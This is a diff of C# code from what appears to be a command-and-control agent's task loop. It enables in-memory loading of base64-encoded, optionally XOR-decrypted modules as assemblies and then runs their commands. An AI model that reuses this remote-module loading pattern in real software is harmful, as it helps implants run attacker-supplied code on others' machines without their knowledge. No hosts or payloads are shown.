@@ -103,18 +103,18 @@ while (true)
                     {
                         task.QueueRunningStatus(messageQueue, messageQueueLock);
 
-                        //ModuleLoadContext loadContext = new();
+                        ModuleLoadContext loadContext = new();
                         using (var stream = new MemoryStream())
                         {
                             var decodedModule = Convert.FromBase64String(task.Module);
-                            //var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
-                            //stream.Write(decodedModule);
-                            //loadContext.AssemblyBytes = stream;
-                            //stream.Position = 0;
-                            //var loadedAssembly = loadContext.LoadFromStream(stream);
+                            // var decodedModule = urlSafeBase64DecodingDecorator.Transform(task.Module);
+                            stream.Write(decodedModule);
+                            loadContext.AssemblyBytes = stream;
+                            stream.Position = 0;
+                            var loadedAssembly = loadContext.LoadFromStream(stream);
 
-                            //var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
-                            //var decryptedBytes = Encoding.UTF8.GetBytes(decryptedModule);
+                            // var decryptedModule = xorDecryptionDecorator.Transform(decodedModule);
+                            // var decryptedBytes = System.Text.Encoding.UTF8.GetBytes(decryptedModule);
                             var module = ModuleLoader.LoadModule(Assembly.Load(decodedModule));
                             foreach (var moduleCommand in module.Commands)
                             {
